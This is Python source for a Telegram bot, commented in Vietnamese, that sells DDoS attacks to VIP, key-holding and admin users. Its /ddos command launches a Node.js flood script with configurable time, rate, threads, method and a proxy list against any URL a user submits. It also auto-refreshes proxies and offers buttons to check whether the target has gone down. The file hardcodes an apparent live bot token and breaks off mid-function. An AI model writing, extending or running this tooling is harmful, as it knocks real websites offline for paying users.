import logging, aiofiles, secrets, time, hashlib, datetime,subprocess
from typing import Set
from collections import Counter, defaultdict
import random, asyncio, os, sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    CallbackContext,
    ContextTypes
)
from telegram.error import NetworkError, TelegramError, TimedOut
import threading
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import json
import requests
import psutil
from functools import wraps, partial
from datetime import datetime, date
import pytz
import re
import ipaddress

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("ddos.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants
TOKEN = '7175807614:AAEUtNjcRb72BJJL0hIsRGcVySYL8hfcS6E' #use 
ADMIN_IDS = [6464715777, 7371969470]  
admins = set(ADMIN_IDS) 
ALLOWED_GROUP_ID = -1002259079939 # usse
MAX_RETRIES = 3
RETRY_DELAY = 5
STATUS_CHECK_COOLDOWN = 5
MAX_CHECK_ATTEMPTS = 5

# Global variables
bot_active = True
status_check_counts = defaultdict(int)
status_check_cooldowns = {}
attack_processes = {}

# File paths
# attack_history_file = "attack_history.json"
# admin_file = "admin.txt"

# Timezone setup
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
def get_vietnam_time():
    return datetime.now(vietnam_tz)

def TimeStamp():
    now = str(date.today())
    return now

# Initialize time variables
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

class ReloadOnChangeHandler(FileSystemEventHandler):
    def __init__(self, restart_callback):
        super().__init__()
        self.restart_callback = restart_callback

    def on_modified(self, event):
        if event.src_path.endswith(".py"):
            logger.info("Detected code change. Restarting bot...")
            self.restart_callback()

def restrict_room(func=None, *, ignore_restriction=False, enable_cooldown=False):
    if func is None:
        return partial(restrict_room, ignore_restriction=ignore_restriction, enable_cooldown=enable_cooldown)
        
    @wraps(func)
    async def wrapper(update: Update, context: CallbackContext):
        if update.message is None:
            return
            
        user_id = update.message.from_user.id
        chat_id = update.message.chat_id
        
        # Kiểm tra bot_active và user_id
        # Cho phép admin bypass hoặc nếu là lệnh /on
        if not bot_active and user_id not in admins and func.__name__ != "bot_on":
            await update.message.reply_text("Bot hiện đang tắt.")
            return
            
        if chat_id != ALLOWED_GROUP_ID and not ignore_restriction:
            return
            
        return await func(update, context)
            
    return wrapper

@restrict_room(ignore_restriction=True)  # Cho phép sử dụng ở mọi chat
async def bot_off(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if not bot_active:
        await update.message.reply_text('Bot hiện đang tắt.')
        return
        
    if user_id in admins:  # Sửa thành so sánh bằng vì ADMIN_ID là số
        bot_active = False
        await update.message.reply_text('Bot đã được tắt.')
    else:
        # await update.message.reply_text('Bạn không có quyền thực hiện thao tác này.')
        pass

@restrict_room(ignore_restriction=True)  # Cho phép sử dụng ở mọi chat  
async def bot_on(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id in admins:  # Sửa thành so sánh bằng vì ADMIN_ID là số
        bot_active = True
        await update.message.reply_text('Bot đã được bật.')
    else:
        # await update.message.reply_text('Bạn không có quyền thực hiện thao tác này.')
        pass
# END ADMIN CONMAND 

async def error_handler(update: object, context: CallbackContext) -> None:
    try:
        if isinstance(context.error, TimedOut):
            if update:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="⌛ Timeout error. Retrying..."
                )
        elif isinstance(context.error, NetworkError):
            if update:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="🌐 Network error. Retrying..."
                )
        else:
            logger.error(f"Update {update} caused error {context.error}")
    except Exception as e:
        logger.error(f"Error in error handler: {e}")

# SQl connect
import pytz
from datetime import date
import mysql.connector
from modules.database_connection import DatabaseConnection
def get_vietnam_time():
    tz = pytz.timezone('Asia/Ho_Chi_Minh')
    return datetime.now(tz)
def TimeStamp():
  now = str(date.today())
  return now
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

db = DatabaseConnection.get_instance()
def load_users_from_mysql():
    try:
        db = DatabaseConnection.get_instance()
        query = "SELECT user_id, expiration_time, expiration_key_time, using_key FROM users"
        results = db.execute_query(query)
        
        if results is None:
            return set(), set(), {}
            
        vip_users = set()
        freeuser = set()
        vip_expiration = {}
        
        if results:
            for (user_id, expiration_time, expiration_key_time, using_key) in results:
                # Convert naive datetime to aware datetime with Vietnam timezone
                if expiration_time:
                    expiration_time = vietnam_tz.localize(expiration_time)
                if expiration_key_time:
                    expiration_key_time = vietnam_tz.localize(expiration_key_time)
                    
                current_time = datetime.now(vietnam_tz)
                
                if expiration_time and expiration_time > current_time:
                    vip_users.add(user_id)
                    vip_expiration[user_id] = expiration_time
                elif using_key and expiration_key_time and expiration_key_time > current_time:
                    freeuser.add(user_id)
        
        return vip_users, freeuser, vip_expiration
    except Exception as e:
        # Log error if needed
        return set(), set(), {}

vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
# End SQl connect
# DDoS
user_cooldowns_ddos = {}
user_cooldowns_ddos_vip = {}
# Định nghĩa các cấu hình cho VIP và FREE users
VIP_CONFIG = {
    'methods': ['FLOOD', 'BYPASS'], 
    'time': 120,  # thời gian ddos vip
    'rate': 15,
    'threads': 10,
    'proxy': './modules/proxy.txt', 
    'cooldown': 130  # thời gian chờ vip
}
FREE_CONFIG = {
    'methods': ['FLOOD'],
    'time': 60,  # thời gian ddos free
    'rate': 10,
    'threads': 8,
    'proxy': './modules/proxy.txt',
    'cooldown': 150  # thời gian chờ free
}
# Dictionary lưu thời gian cooldown của user
user_cooldowns = {}

def validate_url(url: str) -> tuple[bool, str]:
    """
    Validate and format URL
    Returns: (is_valid, formatted_url or error_message)
    """
    # Blacklist domains
    blacklist = [
        "bdu", "edu", "chinhphu", "cloudflare", "gov", "google", 
        "facebook", "tiktok", "microsoft", "apple", "amazon", 
        "netflix", "twitter", "instagram", "github", "gitlab", 
        "heroku", "azure", "aws", "alibaba", "oracle", "ibm", 
        "cisco", "akamai", "youtube", "yahoo", "bing", "paypal", 
        "shopify", "wix", "squarespace", "digitalocean", "linode", 
        "vultr", "godaddy", "namecheap", "cloudways", "plesk", "cpanel"
    ]
    
    # Loại bỏ khoảng trắng
    url = url.strip().lower()  # Convert to lowercase for case-insensitive comparison
    
    # Kiểm tra độ dài URL
    if len(url) < 4 or len(url) > 2048:
        return False, "❌ URL không hợp lệ (độ dài không phù hợp)"

    # Thêm schema nếu không có
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    try:
        # Parse URL để kiểm tra các thành phần
        from urllib.parse import urlparse
        parsed = urlparse(url)
        
        # Kiểm tra hostname
        hostname = parsed.hostname
        if not hostname:
            return False, "❌ URL không hợp lệ (không có hostname)"

        # Kiểm tra IP address
        try:
            ipaddress.ip_address(hostname)
            return False, "❌ Không hỗ trợ tấn công IPv4/IPv6"
        except ValueError:
            pass

        # Kiểm tra blacklist
        for blocked in blacklist:
            if blocked in hostname:
                return False, f'''
?
'''

        # Kiểm tra các ký tự không hợp lệ trong URL
        invalid_chars = set('<>"{}|\\^`')
        if any(char in url for char in invalid_chars):
            return False, "❌ URL chứa ký tự không hợp lệ"

        # Kiểm tra độ dài của từng phần
        if len(hostname) > 253:  # Max length of domain name
            return False, "❌ Domain quá dài"
        
        if parsed.path and len(parsed.path) > 1024:
            return False, "❌ Path quá dài"

        # Kiểm tra TLD hợp lệ (ít nhất 2 ký tự)
        tld = hostname.split('.')[-1]
        if len(tld) < 2:
            return False, "❌ TLD không hợp lệ"

        return True, url

    except Exception as e:
        logger.error(f"URL validation error: {str(e)}")
        return False, "❌ URL không hợp lệ"

# Methods
@restrict_room(ignore_restriction=True)
async def methods(update: Update, context: CallbackContext):
    await update.message.reply_text(f"Phương thức hiện tại:\n<code>{VIP_CONFIG['methods']}</code>", parse_mode='HTML')
# End Methods
active_attacks = {} 
@restrict_room
async def ddos(update: Update, context: CallbackContext):
    vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
    try:
        user_id = update.message.from_user.id
        current_time = time.time()
        # Kiểm tra user type và admin
        is_admin = user_id in admins
        is_vip = user_id in vip_users
        is_free = user_id in freeuser
        if not is_admin and user_id in active_attacks: # bỏ qua admin 
            attack_info = active_attacks[user_id]
            remaining_time = int(attack_info['end_time'] - current_time)
            
            if remaining_time > 0:
                await update.message.reply_text(f'''
╔═════════════════════════
║ ⚠️ Spam t kích bây giờ
║ • Đang tấn công: <code>{attack_info['target']}</code>
║ • Thời gian chờ còn lại: {remaining_time} giây
╚═══════════════════════════''', parse_mode='HTML')
                return
            else:
                # Nếu thời gian đã hết, xóa thông tin tấn công
                del active_attacks[user_id]

        if not (is_admin or is_vip or is_free):
            await update.message.reply_text('''
╔═══════════════════════════
║ • Mua VIP hoặc lấy KEY để /ddos
║ • Lấy key: /laykey
║ • Xác thực key: /key + key đã lấy
╚═══════════════════════════''')
            return

        # Thiết lập config dựa trên loại user
        if is_admin:
            config = VIP_CONFIG.copy()
            config['cooldown'] = 0
            config['time'] = 120  # Hoặc giá trị tối đa cho admin
            config['rate'] = 15    # Tăng rate cho admin
            config['threads'] = 10  # Tăng threads cho admin
        elif is_vip:
            config = VIP_CONFIG.copy()
        else:
            config = FREE_CONFIG.copy()

        # Kiểm tra cooldown (bỏ qua nếu là admin)
        if not is_admin:
            last_used = user_cooldowns.get(user_id, 0)
            if current_time - last_used < config['cooldown']:
                remaining = int(config['cooldown'] - (current_time - last_used))
                await update.message.reply_text(f'''
╔═════════════════════════
║ ⏳ VUI LÒNG ĐỢI
║ • Còn {remaining}s để gọi lệnh /ddos
╚═══════════════════════════''')
                return

        args = context.args
        if is_admin:
            if len(args) < 1:
                await update.message.reply_text('''
╔═════════════════════════
║ 📝 HƯỚNG DẪN ADMIN DDOS
║ ▶ Cách 1:
║ • /ddos + methods + url + time
║ • VD: /ddos FLOOD example.com 300
║ ▶ Cách 2:
║ • /ddos + url + time
║ • VD: /ddos example.com 300
║ ▶ Thông tin:
║ • Không giới hạn thời gian
║ 💡 /methods: để xem phương thức
╚═══════════════════════════''')
                return
        elif is_vip:
            if len(args) < 1:
                await update.message.reply_text(f'''
╔═════════════════════════
║ 📝 DDOS VIP USER
║ ▶ Cách 1:
║ • /ddos + url
║ • VD: /ddos example.com
║ ▶ Cách 2:
║ • /ddos + phương thức + url
║ • VD: /ddos BYPASS example.com
║ ▶ Thông tin:
║ • Thời gian: {config['time']}s
║ • Cooldown: {config['cooldown']}s
║ 💡 /methods: để xem phương thức
╚══════════════════════════''')
                return
        else:  # FREE user
            if len(args) < 1:
                await update.message.reply_text(f'''
╔═════════════════════════
║ 📝 DDOS FREE USER
║ • /ddos + url
║ • VD: /ddos example.com
║ ▶ Thông tin:
║ • Thời gian: {config['time']}s
║ • Cooldown: {config['cooldown']}s
║ • Chỉ hỗ trợ: FLOOD
╚═══════════════════════════''')
                return

        if is_admin:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
                attack_time = int(args[2]) if len(args) > 2 and args[2].isdigit() else config['time']
            else:
                method = 'FLOOD'  # Default method
                url = args[0]
                attack_time = int(args[1]) if len(args) > 1 and args[1].isdigit() else config['time']
        elif is_vip:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
            else:
                method = 'FLOOD'
                url = args[0]
            attack_time = config['time']  # VIP users use fixed time
        else:  # FREE user
            method = 'FLOOD'
            url = args[0]
            attack_time = config['time']

        if url is None:
            await update.message.reply_text('''
Sử dụng /ddos để xem hướng dẫn
''')
            return
        # Validate URL
        is_valid, result = validate_url(url)
        if not is_valid:
            await update.message.reply_text(result)
            return
        url = result  # Use validated and formatted URL

        # Lấy các thông số từ config
        rate = config['rate']
        threads = config['threads']
        proxy = config['proxy']

        max_time = 200 # đảm bảo không vượt quá thời gian. Nếu vượt -> 200 ( max tine ddos)
        if attack_time > max_time:
            attack_time = max_time
        try:
            if not is_admin:
                active_attacks[user_id] = {
                    'end_time': current_time + attack_time,
                    'target': url
                }
            process = subprocess.Popen([
                'node',
                '--max-old-space-size=4096',
                'modules/two-methods.js',
                url,
                str(min(attack_time, max_time)), 
                str(rate),
                str(threads),
                proxy,
                method
            ])
            attack_processes[update.message.chat_id] = process
            
        except Exception as e:
            logger.error(f"Error starting attack process: {e}")
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ LỖI KHỞI ĐỘNG
║ • Không thể bắt đầu tấn công
║ • Vui lòng thử lại sau
╚═══════════════════════════''')
            return

        # Cập nhật cooldown
        user_cooldowns[user_id] = current_time

        # Create keyboard
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔍 Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("📊 Kiểm tra nhanh", callback_data=f"st_{url}")
            ]
        ])

        # Xác định user type cho tin nhắn
        if is_admin:
            user_type = "ADMIN"
        elif is_vip:
            user_type = "VIP"
        else:
            user_type = "FREE"

        attack_msg = await update.message.reply_text(
            f'''
╔═════════════════════════
║ 🚀 Bắt đầu tấn công [{user_type}]
║ • Website: <code>{url}</code>
║ • Thời gian: {attack_time}s
║ • Request/s: {rate}
║ • Luồng: {threads}
║ • Phương thức: {method}
║ • Sử dụng lại trong: {config['cooldown']} giây
╚═══════════════════════════''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )

        # Schedule attack end
        async def end_attack():
            try:
                await asyncio.sleep(attack_time)
                
                # Kill the process
                if process.poll() is None:  # Check if process is still running
                    process.terminate()
                    try:
                        process.wait(timeout=5)  # Wait up to 5 seconds for graceful termination
                    except subprocess.TimeoutExpired:
                        process.kill()  # Force kill if graceful termination fails
                
                # Remove from active processes
                attack_processes.pop(update.message.chat_id, None)
                
                # Update message to show attack ended
                try:
                    await attack_msg.edit_text(
                        f'''
╔══════════════════════════
║ 🛑 Dừng tấn công
║ • Website: <code>{url}</code>
║ • Thời gian: {attack_time}s
║ • Phương thức: {method}
║ • Trạng thái: Hoàn thành
╚═══════════════════════════''',
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.error(f"Error updating end message: {e}")
                    
            except Exception as e:
                logger.error(f"Error in end_attack: {e}")

        # Start the end_attack coroutine
        asyncio.create_task(end_attack())
        
    except Exception as e:
        logger.error(f"Error in ddos command: {e}")
        await update.message.reply_text(f"❌")

async def handle_status_check(update: Update, context: CallbackContext):
    query = update.callback_query
    try:
        message_id = f"{query.message.chat.id}_{query.message.message_id}"
        user_id = query.from_user.id
        current_time = time.time()
        
        url = query.message.text.split('Website: ')[1].split('\n')[0].strip()
        if url.startswith('<code>'):
            url = url[6:-7]
            
        status_check_counts[message_id] += 1
        
        if status_check_counts[message_id] > MAX_CHECK_ATTEMPTS:
            await query.message.delete()
            await query.answer(
                "❌ Max check attempts exceeded",
                show_alert=True
            )
            return
            
        last_check = status_check_cooldowns.get(user_id, 0)
        if current_time - last_check < STATUS_CHECK_COOLDOWN:
            remaining = round(STATUS_CHECK_COOLDOWN - (current_time - last_check))
            remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
            await query.answer(
                f"⏳ Đợi {remaining}s để kiểm tra lại\n"
                f"📊 {remaining_checks} lượt kiểm tra",
                show_alert=True
            )
            return
            
        status_check_cooldowns[user_id] = current_time
        
        # Update message with checking status immediately
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔍 Kiểm tra Website", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("⏳ Đang xử lý", callback_data="cooldown")
            ]
        ])

        remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
        await query.message.edit_text(
            f'''
╔═══════════════════════════
║ ⏳ ĐANG KIỂM TRA WEBSITE
║ • Website: <code>{url}</code>
║ • {remaining_checks} lượt kiểm tra
║ ⚠️ Vui lòng đợi...
╚═══════════════════════════''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
        # Check website status with timeout
        try:
            response = await asyncio.wait_for(
                asyncio.get_event_loop().run_in_executor(
                    None, 
                    lambda: requests.get(url, timeout=10)
                ),
                timeout=10
            )
            
            status_code = response.status_code
            if status_code == 200:
                status = "🟢 Sống"
            elif status_code >= 500:
                status = "🔴 Chết"  
            else:
                status = f"🟡 Phản hồi: {status_code}"
                
        except (requests.Timeout, asyncio.TimeoutError):
            status = "🔴 TIMEOUT HOẶC Chết"
            response = None
            
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔍 Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("📊 Kiểm tra nhanh", callback_data=f"st_{url}")
            ]
        ])
        
        response_time = response.elapsed.total_seconds() if response else 10
        await query.message.edit_text(
            f'''
╔══════════════════════════
║ 📊 TRẠNG THÁI WEBSITE
║ ▶ Thông tin:
║ • Website: <code>{url}</code>
║ • Trạng thái: {status}
║ • Thời gian phản hồi: {response_time:.2f} giây
║ • Kiểm tra lại: {STATUS_CHECK_COOLDOWN} giây
║ • {remaining_checks} lượt kiểm tra
╚═══════════════════════════''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
            
    except Exception as e:
        logger.error(f"Error checking status: {e}")

async def cleanup_attacks():
    """Clean up all running attack processes"""
    for chat_id, process in attack_processes.items():
        try:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        except Exception as e:
            logger.error(f"Error cleaning up process for chat {chat_id}: {e}")
    attack_processes.clear()

# Biến global để kiểm soát cron job
last_proxy_update = 0
PROXY_UPDATE_INTERVAL = 1800 

# Hàm xử lý cập nhật proxy
# async def update_proxy(restart=False):
#     """
#     Hàm cập nhật proxy
#     restart: True nếu cần restart bot sau khi update (dùng cho lệnh /proxy)
#     """
#     try:
#         logger.info("Starting proxy update...")
#         start_time = time.time()
        
#         # Kill tất cả tiến trình Node.js đang chạy
#         killed = False
#         try:
#             # Kill qua psutil
#             for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
#                 try:
#                     if proc.info['name'] == 'node':
#                         cmdline = proc.info['cmdline']
#                         if cmdline and any(x in ' '.join(cmdline) for x in ['two-methods.js']):
#                             process = psutil.Process(proc.info['pid'])
#                             children = process.children(recursive=True)
#                             for child in children:
#                                 child.kill()
#                             psutil.wait_procs(children, timeout=3)
#                             process.kill()
#                             killed = True
#                 except:
#                     continue

#             # Kill qua shell command
#             if os.name == 'nt':
#                 os.system('taskkill /F /IM node.exe')
#             else:
#                 os.system("pkill -9 -f 'node.*two-methods.js'")
#             await asyncio.sleep(2)
            
#         except Exception as e:
#             logger.error(f"Error killing Node.js processes: {e}")
        
#         # Tải HTTP proxy
#         process = await asyncio.create_subprocess_exec(
#             'node', './modules/get-proxy.js',
#             stdin=asyncio.subprocess.PIPE,
#             stdout=asyncio.subprocess.PIPE,
#             stderr=asyncio.subprocess.PIPE
#         )
#         await process.communicate(input=b"1\n")
        
#         # Tải SOCKS proxy
#         process = await asyncio.create_subprocess_exec(
#             'node', './modules/get-proxy.js',
#             stdin=asyncio.subprocess.PIPE,
#             stdout=asyncio.subprocess.PIPE,
#             stderr=asyncio.subprocess.PIPE
#         )
#         await process.communicate(input=b"2\n")
        
#         existing_proxies = []
#         if os.path.exists('./modules/proxy.txt'):
#             with open('./modules/proxy.txt', 'r') as f:
#                 existing_proxies = f.readlines()[:0]
        
#         # Đọc proxy mới
#         new_proxies = []
#         if os.path.exists('http.txt'):
#             with open('http.txt', 'r') as source:
#                 new_proxies.extend(source.readlines())
#         if os.path.exists('socks.txt'):
#             with open('socks.txt', 'r') as source:
#                 new_proxies.extend(source.readlines())
        
#         os.makedirs('./modules', exist_ok=True)
        
#         # Ghi proxy vào file
#         with open('./modules/proxy.txt', 'w') as dest:
#             dest.writelines(existing_proxies)
#             dest.writelines(new_proxies)
        
#         # Xóa files tạm
#         try:
#             if os.path.exists('http.txt'):
#                 os.remove('http.txt')
#             if os.path.exists('socks.txt'):
#                 os.remove('socks.txt')
#         except Exception as e:
#             logger.error(f"Warning: Could not delete temporary files: {e}")

#         logger.info(f"Proxy update completed in {time.time() - start_time:.2f}s")
#         return len(new_proxies), len(existing_proxies)
        
#     except Exception as e:
#         logger.error(f"Error in update_proxy: {e}")
#         return 0, 0

async def update_proxy(restart=False):
    """
    Hàm cập nhật proxy
    restart: True nếu cần restart bot sau khi update (dùng cho lệnh /proxy)
    """
    try:
        logger.info("Starting proxy update...")
        start_time = time.time()
        
        # Kill tất cả tiến trình Node.js đang chạy
        killed = False
        try:
            # Kill qua psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'] == 'node':
                        cmdline = proc.info['cmdline']
                        if cmdline and any(x in ' '.join(cmdline) for x in ['two-methods.js']):
                            process = psutil.Process(proc.info['pid'])
                            children = process.children(recursive=True)
                            for child in children:
                                child.kill()
                            psutil.wait_procs(children, timeout=3)
                            process.kill()
                            killed = True
                except:
                    continue

            # Kill qua shell command
            if os.name == 'nt':
                os.system('taskkill /F /IM node.exe')
            else:
                os.system("pkill -9 -f 'node.*two-methods.js'")
            await asyncio.sleep(2)
            
        except Exception as e:
            logger.error(f"Error killing Node.js processes: {e}")

        # Tải proxy trực tiếp từ API
        try:
            response = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: requests.get('https://daudau.org/api/http.txt', timeout=10)
            )
            response.raise_for_status()
            new_proxies = response.text.splitlines()
            
            # Lọc và validate proxy
            valid_proxies = []
            for proxy in new_proxies:
                proxy = proxy.strip()
                if proxy and ':' in proxy:
                    try:
                        ip, port = proxy.split(':')
                        # Validate IP
                        ipaddress.ip_address(ip)
                        # Validate port
                        port = int(port)
                        if 1 <= port <= 65535:
                            valid_proxies.append(proxy)
                    except:
                        continue

            # Đảm bảo thư mục modules tồn tại
            os.makedirs('./modules', exist_ok=True)
            
            # Ghi proxy vào file
            proxy_path = './modules/proxy.txt'
            with open(proxy_path, 'w') as f:
                f.write('\n'.join(valid_proxies))

            logger.info(f"Proxy update completed in {time.time() - start_time:.2f}s")
            return len(valid_proxies), 0

        except Exception as e:
            logger.error(f"Error fetching proxies from API: {e}")
            return 0, 0
            
    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        return 0, 0

async def check_and_update_proxy(context: CallbackContext):
    """Kiểm tra và cập nhật proxy theo interval (không restart)"""
    global last_proxy_update
    current_time = time.time()
    
    if current_time - last_proxy_update >= PROXY_UPDATE_INTERVAL:
        try:
            new_count, existing_count = await update_proxy(restart=False)
            last_proxy_update = current_time
            logger.info(f"Auto proxy update: {new_count} new, {existing_count} existing")
        except Exception as e:
            logger.error(f"Error in auto proxy update: {e}")

# Cron job để tự động cập nhật proxy
async def proxy_cron():
    global proxy_cron_running
    
    if proxy_cron_running:
        return
        
    proxy_cron_running = True
    
    try:
        while True:
            await asyncio.sleep(20)  # Chờ 20 giây giữa các lần cập nhật
            try:
                new_count, existing_count = await update_proxy()
                logger.info(f"Cron job updated proxies: {new_count} new, {existing_count} existing")
            except Exception as e:
                logger.error(f"Error in proxy cron job: {e}")
                
    except asyncio.CancelledError:
        proxy_cron_running = False
        raise
    except Exception as e:
        logger.error(f"Proxy cron job stopped: {e}")
        proxy_cron_running = False

# Command handler cho lệnh /proxy
@restrict_room
async def proxy(update: Update, context: CallbackContext):
    """Command handler cho lệnh /proxy"""
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        # Tắt bot trước khi bắt đầu
        bot_active = False
        start_time = time.time()
        
        msg = await update.message.reply_text('''
╔═════════════════════════
║ ⚡️ ĐANG TẢI PROXY...
║ • Bot đã tắt
║ • Đang kill các tiến trình cũ
╚═══════════════════════════
''')

        new_count, existing_count = await update_proxy(restart=True)
        
        # Lưu thông tin restart
        restart_info = {
            "chat_id": update.message.chat_id,
            "message_id": msg.message_id,
            "restart_time": start_time,
            "action": "proxy_reload"
        }
        
        with open("restart_info.txt", "w") as f:
            json.dump(restart_info, f)
        
        await msg.edit_text(f'''
╔═════════════════════════
║ ✅ TẢI PROXY THÀNH CÔNG
║ • Đã giữ lại {existing_count} proxy cũ
║ • Đã thêm {new_count} proxy mới
║ • Đang khởi động lại bot...
║ ⚡️ Thời gian xử lý: {time.time() - start_time:.2f}s
╚═══════════════════════════
''')

        # Khởi động lại bot
        os.execl(sys.executable, sys.executable, *sys.argv)

    except Exception as e:
        logger.error(f"Error in proxy command: {e}")
        await update.message.reply_text(f'''
╔═════════════════════════
║ ❌ TẢI PROXY THẤT BẠI
║ • Lỗi: {str(e)}
╚═══════════════════════════
''')
        bot_active = True

async def send_restart_notification(application: Application) -> None:
    """Send notification after bot restart"""
    try:
        if os.path.exists("restart_info.txt"):
            with open("restart_info.txt", "r") as f:
                restart_info = json.load(f)
            
            restart_duration = round(time.time() - restart_info["restart_time"], 2)
            chat_id = restart_info["chat_id"]
            action = restart_info.get("action", "restart")

            if action == "proxy_reload":
                message = f'''
╔═════════════════════════
║ ✅ KHỞI ĐỘNG LẠI THÀNH CÔNG
║ • Bot đã được bật
║ • Proxy đã được cập nhật
║ ⚡️ Tổng thời gian: {restart_duration}s
╚═══════════════════════════'''
            else:
                message = f'''
╔══════════════════════════
║ ✅ KHỞI ĐỘNG LẠI THÀNH CÔNG
║ ⚡️ Tổng thời gian: {restart_duration}s
╚═══════════════════════════'''
            try:
                await application.bot.send_message(
                    chat_id=chat_id,
                    text=message
                )
                logger.info("Đã gửi thông báo khởi động thành công")
            except Exception as e:
                logger.error(f"Lỗi khi gửi thông báo: {e}")
            
            try:
                os.remove("restart_info.txt")
                logger.info("Đã xóa file restart_info.txt")
            except Exception as e:
                logger.error(f"Lỗi khi xóa file: {e}")
                
            # Đảm bảo bot được bật sau khi khởi động lại
            global bot_active
            bot_active = True
            
    except Exception as e:
        logger.error(f"Lỗi trong send_restart_notification: {e}")

# Task Manager Command
@restrict_room
async def task(update: Update, context: CallbackContext):
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # CPU & Memory info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_used = round(memory.used/1024/1024/1024, 2)
        memory_total = round(memory.total/1024/1024/1024, 2)
        memory_percent = memory.percent

        # Process count
        process_count = len(psutil.pids())

        # Network info
        net_io = psutil.net_io_counters()
        bytes_sent = round(net_io.bytes_sent/1024/1024, 2)
        bytes_recv = round(net_io.bytes_recv/1024/1024, 2)

        # Disk info
        total_disk_space = 0
        used_disk_space = 0
        try:
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    total_disk_space += partition_usage.total
                    used_disk_space += partition_usage.used
                except Exception:
                    continue
            
            total_disk_space_gb = round(total_disk_space/1024/1024/1024, 2)
            used_disk_space_gb = round(used_disk_space/1024/1024/1024, 2)
            disk_percent = round((used_disk_space / total_disk_space) * 100, 2)
        except Exception as e:
            logger.error(f"Error getting disk info: {e}")
            total_disk_space_gb = used_disk_space_gb = disk_percent = 0

        # Uptime
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        days = uptime.days
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{days} ngày, {hours} giờ, {minutes} phút"

        system_info = f"""
╭━━━━━「 Thông Tin Hệ Thống 」━━━━━
┣━⊳ 🔲 CPU: {cpu_percent}%
┣━⊳ 💾 RAM: {memory_percent}%
┣━⊳ 📊 RAM đã dùng: {memory_used}/{memory_total}GB
┣━⊳ 💿 Tổng bộ nhớ: {total_disk_space_gb}GB
┣━⊳ 📀 Đã sử dụng: {used_disk_space_gb}GB ({disk_percent}%)
┣━⊳ 🌐 Network:
┣━⊳ ⬆️ Đã gửi: {bytes_sent}MB
┣━⊳ ⬇️ Đã nhận: {bytes_recv}MB
┣━⊳ ⏰ Uptime: {uptime_str}
┗━⊳ 📱 Số tiến trình: {process_count}
╰━━━━━━━━━━━━━━━━━━━━━━━━━"""

        await update.message.reply_text(system_info)

    except Exception as e:
        logger.error(f"Error in task command: {e}")
        await update.message.reply_text(f"❌ Lỗi khi lấy thông tin hệ thống: {str(e)}")

@restrict_room
async def list_processes(update: Update, context: CallbackContext):
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # Tìm tất cả các tiến trình node.js đang chạy
        node_processes = []
        target_files = ['two-methods.js'] 
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'create_time', 'memory_info']):
            try:
                # Kiểm tra nếu process info là None
                if not proc.info:
                    continue
                    
                # Kiểm tra tên process
                if proc.info.get('name') != 'node':
                    continue
                    
                # Lấy và kiểm tra cmdline
                cmdline = proc.info.get('cmdline')
                if not cmdline:  # Skip if cmdline is None or empty
                    continue
                    
                # Kiểm tra xem có phải process target không
                is_target_process = any(file in ' '.join(cmdline) for file in target_files)
                
                if is_target_process:
                    process = psutil.Process(proc.info['pid'])
                    create_time = datetime.fromtimestamp(process.create_time())
                    running_time = datetime.now() - create_time
                    memory_info = process.memory_info()
                    memory_mb = round(memory_info.rss / 1024 / 1024, 2) if memory_info else 0
                    
                    target_url = "N/A"
                    process_type = "N/A"
                    
                    # Tìm URL và loại process
                    for i, cmd in enumerate(cmdline):
                        if any(file in cmd for file in target_files):
